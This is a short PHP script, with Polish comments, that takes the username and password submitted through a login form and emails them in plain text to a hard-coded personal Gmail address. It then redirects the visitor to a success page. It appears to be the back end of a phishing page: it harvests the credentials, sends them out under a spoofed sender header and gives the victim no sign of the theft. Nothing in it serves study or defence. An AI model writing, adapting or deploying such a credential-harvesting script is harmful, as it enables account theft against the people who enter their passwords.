<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Pobranie danych z formularza
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Adres e-mail, na który ma być wysłana wiadomość
    $to = 'grzesiu.antoszczyszyn@gmail.com'; // Podaj tutaj swój adres e-mail
    $subject = 'Nowe dane logowania';

    // Treść wiadomości
    $message = "Użytkownik: " . $username . "\nHasło: " . $password;

    // Nagłówki wiadomości
    $headers = 'From: 123@gmail.com' . "\r\n" .
               'Reply-To: grzesiu.antoszczyszyn@gmail.com' . "\r\n" .
               'X-Mailer: PHP/' . phpversion();

    // Wysłanie e-maila
    mail($to, $subject, $message, $headers);

    // Przekierowanie do strony potwierdzającej
    header("Location: success.html");
    exit();
}
?>
